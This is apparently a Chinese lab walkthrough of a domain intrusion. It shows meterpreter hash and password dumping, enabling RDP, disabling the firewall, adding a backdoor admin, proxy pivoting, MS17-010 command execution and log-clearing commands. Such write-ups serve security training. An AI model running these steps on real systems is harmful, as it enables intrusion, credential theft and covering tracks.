<h3 id="_21"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/cb4c3d443f994cfa5b4b87b42b8f982c.png" alt="cb4c3d443f994cfa5b4b87b42b8f982c.png" width="784" height="253" class="jop-noMdConv"></h3>
<h3 id="_22">定位域控，域控一般都为时间服务器</h3>
<div class="highlight"><pre><span></span><code>C:\Windows\system32&gt;net time /domain
net time /domain
Current time at \\owa.god.org is 2023/2/1 11:41:04

The command completed successfully.
</code></pre></div>
<h3 id="ip19216852138">确定域控ip为<code>192.168.52.138</code></h3>
<h3 id="_23"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/87dc8d994343b159810ad8ee0e203330.png" alt="87dc8d994343b159810ad8ee0e203330.png" width="566" height="220" class="jop-noMdConv"></h3>
<h3 id="_24">接下来迁移会话进程</h3>
<h3 id="_25"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/27f352614a4bc73c6757751ab1527dbe.png" alt="27f352614a4bc73c6757751ab1527dbe.png" width="608" height="211" class="jop-noMdConv"></h3>
<h3 id="hashdump">hashdump</h3>
<h3 id="ps-ridlm-hash-nt-hash-rid-windows-linux-uidgid-500-administrator501-guest-lm-hash-nt-hash-hash-cmd5"><strong>PS:格式是：用户名称: RID:LM-HASH 值: NT-HASH 值，rid 是 windows 系统账户对应固定的值，类似于 linux 的 uid，gid 号，500 为 administrator，501 为 guest 等。而 lm 的 hash 和 nt 的 hash,都是对用户密码进行的加密，只不过加密方式不一样。复制其中一种加密的 hash 可以直接使用在线 cmd5 破解</strong></h3>
<div class="highlight"><pre><span></span><code>meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</code></pre></div>
<h3 id="systemload-kiwicreds_allhongrisec2019">由于已经获得system权限，可以加载<code>load kiwi</code>模块，<code>creds_all</code>导出明文密码<code>hongrisec@2019</code></h3>
<h3 id="_26"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/c422e005743256a98801712346950f00.png" alt="c422e005743256a98801712346950f00.png" width="621" height="421" class="jop-noMdConv"></h3>
<h3 id="33893389">查看3389开放情况，并尝试打开3389,关闭防火墙，连接远程桌面</h3>
<h3 id="netstat-an-findstr-3389"><code>netstat -an | findstr “3389”</code>查看远程端口</h3>
<h3 id="_27"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/ac6d64d06ae5849031880b418f431f75.png" alt="ac6d64d06ae5849031880b418f431f75.png" width="320" height="66" class="jop-noMdConv"></h3>
<h3 id="3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-00000000-f">开启3389<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></h3>
<h3 id="3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-11111111-f">关闭3389<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f）</code></h3>
<h3 id="_28"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/2d2d14840721f3512a00006c0d226771.png" alt="2d2d14840721f3512a00006c0d226771.png" width="876" height="94" class="jop-noMdConv"></h3>
<h3 id="_29">关闭防火墙：</h3>
<h3 id="windows-server-2003-netsh-firewall-set-opmode-disable">Windows Server 2003 系统及之前版本<code>netsh firewall set opmode disable</code></h3>
<h3 id="windows-server-2003-netsh-advfirewall-set-allprofiles-state-off">Windows Server 2003 之后系统版本<code>netsh advfirewall set allprofiles state off</code></h3>
<h3 id="_30">或者</h3>
<h3 id="3389-netsh-advfirewall-firewall-add-rule-nameremote-desktop-protocoltcp-dirin-localport3389-actionallow">允许 3389 端口放行<code>netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</code></h3>
<h3 id="_31"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1651239ba9f818ff90063a8694365f8b.png" alt="1651239ba9f818ff90063a8694365f8b.png" width="795" height="155" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/e5cb6c0126740c8c4a45c4ce956941d9.png" alt="e5cb6c0126740c8c4a45c4ce956941d9.png" width="625" height="369" class="jop-noMdConv"></h3>
<h3 id="_32">可以添加一个用户备用啥的</h3>
<h3 id="net-user-username-password-add"><code>net user [username] [password] /add</code></h3>
<h3 id="administrators">添加到Administrators用户组</h3>
<h3 id="net-localgroup-administrators-username-add"><code>net localgroup Administrators [username] /add</code></h3>
<h3 id="_33">激活用户</h3>
<h3 id="net-user-username-activeyes"><code>net user [username] /active:yes</code></h3>
<h3 id="_34"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/207d46dba19b1687398b68b3cf6a0d67.png" alt="207d46dba19b1687398b68b3cf6a0d67.png" width="653" height="314" class="jop-noMdConv"></h3>
<h3 id="_35">搭建代理–横向渗透</h3>
<h3 id="win719216852c">由于已经发现win7存在内网<code>192.168.52</code>的c段，搭建代理通道</h3>
<h3 id="_36">首先添加路由,并将会话切至后台</h3>
<h3 id="_37"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/89c270848e19b7ee2adb05c213b64f1c.png" alt="89c270848e19b7ee2adb05c213b64f1c.png" width="672" height="448" class="jop-noMdConv"></h3>
<h3 id="socks">设置socks代理</h3>
<h3 id="_38"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a5f97594e23c016057808cd2c2101c67.png" alt="a5f97594e23c016057808cd2c2101c67.png" width="714" height="495" class="jop-noMdConv"></h3>
<h3 id="proxychainsmsfsocksetcproxychains4conf">再设置proxychains代理配置为msf的socks代理端口<code>/etc/proxychains4.conf</code></h3>
<h3 id="_39"><img alt="5de723669abd12097b48718fcf258ae5.png" src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/5de723669abd12097b48718fcf258ae5.png" /></h3>
<h3 id="52">探测52网段主机存活</h3>
<h3 id="_40"><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/4a193f55aec5181a4eb84bb00418077d.png" alt="4a193f55aec5181a4eb84bb00418077d.png" width="707" height="336" class="jop-noMdConv"></h3>
<p>首先先<code>win2003</code>–<code>192.168.52.141</code></p>
<p>使用<code>use auxiliary/scanner/portscan/tcp</code>对<code>192.168.52.141</code>进行端口扫描</p>
<p><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/d1434ac9f728648054b21c4e15252cec.png" alt="d1434ac9f728648054b21c4e15252cec.png" width="776" height="302" class="jop-noMdConv"></p>
<p>可以看到开启了445端口，探测下samba服务<code>use auxiliary/scanner/smb/smb_version</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/de2abf95fff0e219af5dc0d615b8a896.png" alt="de2abf95fff0e219af5dc0d615b8a896.png" width="764" height="132" class="jop-noMdConv"></p>
<p>测试smb相关的漏洞</p>
<p><code>use auxiliary/admin/smb/ms17_010_command</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/466ee5a98ddb1f51f3989f0694b2770e.png" alt="466ee5a98ddb1f51f3989f0694b2770e.png" width="801" height="386" class="jop-noMdConv"></p>
<p>设置命令–&gt;添加一个用户并设置管理员权限，然后开启3389端口</p>
<p><code>set command "net user hack #hack123@ /add" 创建用户</code></p>
<p><code>set command "net localgroup Administrators hack /add"</code></p>
<p><code>set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f’ 打开3389端口</code></p>
<p><code>set command "netsh firewall set opmode mode=disable" 关闭防火墙</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/8427bec12f778b75daac39158c670acb.png" alt="8427bec12f778b75daac39158c670acb.png" width="660" height="466" class="jop-noMdConv"></p>
<hr />
<h2 id="_41">拿下域控权限</h2>
<p>扫描域控端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9f77a1164dfa23e9c06a612f48760bbd.png" alt="9f77a1164dfa23e9c06a612f48760bbd.png" width="792" height="539" class="jop-noMdConv"> <img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/e55483a3394c21c907b6fa8162eda9e5.png" alt="e55483a3394c21c907b6fa8162eda9e5.png" width="908" height="197" class="jop-noMdConv"></p>
<p>发现smb服务，尝试利用smb漏洞</p>
<p><code>use exploit/windows/smb/ms17_010_psexec</code>未成功</p>
<p>用<code>use auxiliary/admin/smb/ms17_010_command</code>添加用户并开启3389然后连接</p>
<div class="highlight"><pre><span></span><code>set command &quot;net user hack #hack123@ /add&quot; 创建用户

set command  &quot;net localgroup Administrators hack /add&quot; 

set command ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f’ 打开3389端口

set command  &quot;netsh firewall set opmode mode=disable&quot;  关闭防火墙
</code></pre></div>
<hr />
<p>这是清理痕迹的一些参考方法</p>
<div class="highlight"><pre><span></span><code>有远程桌面权限时手动删除日志：
开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志

wevtutil：
    wevtutil el 列出系统中所有日志名称
    wevtutil cl system 清理系统日志
    wevtutil cl application 清理应用程序日志
    wevtutil cl security 清理安全日志

meterperter自带清除日志功能：
clearev 清除windows中的应用程序日志、系统日志、安全日志

清除recent：
在文件资源管理器中点击 &quot;查看&quot; -&gt; &quot;选项&quot; -&gt;在常规-&gt;隐私中点击&quot; 清除&quot; 按钮
或直接打开C:\Users\Administrator\Recent并删除所有内容
或在命令行中输入del /f /s /q  &quot;%userprofile%\Recent*.*
</code></pre></div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
      
    
  </body>
</html>